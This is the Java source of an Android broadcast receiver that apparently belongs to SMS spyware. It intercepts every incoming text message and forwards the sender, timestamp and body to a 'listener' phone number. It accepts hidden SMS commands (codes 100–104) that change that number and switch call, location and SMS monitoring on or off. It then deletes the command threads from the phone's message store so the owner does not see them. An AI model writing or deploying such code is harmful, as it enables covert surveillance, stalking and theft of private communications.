package com.receiver;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.service.SendSMSService;

import value.getValueUtil;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver{
public static String tomyphone ;
	@Override
	public void onReceive(Context context, Intent intent) {
		getValueUtil gvu = new getValueUtil();
		tomyphone = gvu.getmyValueforListenerNumber(context);
		if(gvu.getmyValueforListenerYesOrNo(context).equals("yes")){
			if(gvu.getmyValueforSMSYesOrNo(context).equals("yes")){
				myReadSMS(context, intent ,"yes");
			}else{
				//还需要判断是否监听者发来的短信
				myReadSMS(context, intent ,"no");
				System.out.println("短信监听停止");
			}
		}else{
			myReadSMS(context, intent ,"no");
			System.out.println("监听停止");
		}
	}
	
	@SuppressLint("SimpleDateFormat")
	public void myReadSMS(Context context, Intent intent,String yesOrNo){
		getValueUtil gvu = new getValueUtil();
		Bundle bundle = intent.getExtras();
		Object[] myObjects = (Object[])bundle.get("pdus");
		SmsMessage[] messages = new SmsMessage[myObjects.length];
		for (int i = 0; i < messages.length; i++) {
			messages[i] = SmsMessage.createFromPdu((byte[]) myObjects[i]);
			Date date = new Date(messages[i].getTimestampMillis());
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
			String toMyMsg ="new message: "+df.format(date)+" sender is: "+messages[i].getOriginatingAddress()+" context is: "+messages[i].getMessageBody();
			System.out.println("context =="+messages[i].getMessageBody());
			String[] strMsg = messages[i].getMessageBody().split(":");
			if(strMsg.length>=3){
				if(strMsg[2].equals("myListenerMessage")){
					if(strMsg[0].equals("100")){
						gvu.setmyValueforListenerNumber(strMsg[1], context);
						tomyphone = gvu.getmyValueforListenerNumber(context);
						String message = "new number "+strMsg[1]+" change success ";
						MySendSMS(message,context,intent);
						deleteSMS(context,tomyphone);
						break;
					}else if(strMsg[0].equals("101")){
						gvu.setmyValueforListenerYesOrNo(strMsg[1], context);
						String message = "Listener is "+strMsg[1];
						MySendSMS(message,context,intent);
						deleteSMS(context,tomyphone);
						break;
					}else if(strMsg[0].equals("102")){
						gvu.setmyValueforCallYesOrNo(strMsg[1], context);
						String message = "Call is "+strMsg[1];
						MySendSMS(message,context,intent);
						deleteSMS(context,tomyphone);
						break;
					}else if(strMsg[0].equals("103")){
						gvu.setmyValueforLocationYesOrNo(strMsg[1], context);
						String message = "Location is "+strMsg[1];
						MySendSMS(message,context,intent);
						deleteSMS(context,tomyphone);
						break;
					}else if(strMsg[0].equals("104")){
						gvu.setmyValueforSMSYesOrNo(strMsg[1], context);
						String message = "SMS is "+strMsg[1];
						MySendSMS(message,context,intent);
						deleteSMS(context,tomyphone);
						break;
					}
				}
			}
			if(yesOrNo.equals("yes")){//本来允许发送才可以发送
				MySendSMS(toMyMsg,context,intent);
			}
		}
	}
	
	public  void MySendSMS(String message,Context context, Intent intent){
        PendingIntent pi = PendingIntent.getActivity(context, 0, intent, 0);
        SmsManager smsManager = SmsManager.getDefault();
        List<String> divideContents = smsManager.divideMessage(message);  
        for (String text : divideContents) { 
        	smsManager.sendTextMessage(tomyphone, null, text, pi, null);
        } 
    }
	
	public void deleteSMS(Context context,String number) {
	    try {  
	    	ContentResolver CR = context.getContentResolver();  
	        Cursor cursor = CR.query(Uri.parse("content://sms/"), null, null, null,null); 
	        while (cursor.moveToNext()) { 
	        	String phoneNumber = cursor.getString(cursor.getColumnIndex("address"));  
	        	String smsId = cursor.getString(cursor.getColumnIndex("_id"));  
	        	String thread_id = cursor.getString(cursor.getColumnIndex("thread_id"));  
	        	if (phoneNumber.equals(number)) {  
	        		System.out.println("number="+number);
	        		System.out.println("smsId="+smsId);
	        		System.out.println("thread_id="+thread_id);
	        		CR.delete(Uri.parse("content://sms"), "thread_id=" + thread_id, null);  
	        	}
	        } 
	    } catch (Exception e) {
	    }  
	} 
}
